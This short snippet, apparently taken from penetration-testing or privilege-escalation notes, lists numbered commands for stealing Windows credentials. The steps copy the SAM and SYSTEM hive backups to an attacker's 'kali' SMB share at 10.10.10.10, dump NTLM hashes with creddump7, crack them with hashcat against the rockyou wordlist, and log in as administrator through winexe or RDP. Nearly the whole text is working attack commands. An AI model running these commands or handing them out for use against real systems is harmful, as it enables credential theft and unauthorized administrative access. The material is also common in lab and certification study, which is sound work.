
1. **Copy SAM and SYSTEM Files:**
   ```plaintext
   copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
   copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
   ```

2. **Dump Hashes from SAM and SYSTEM Files:**
   ```plaintext
   python3 creddump7/pwdump.py SYSTEM SAM
   ```

3. **Crack Password Hash:**
   ```plaintext
   hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
   ```

4. **Authenticate Using the Cracked Password:**
   - Use `winexe` or `RDP` to log in as the admin.
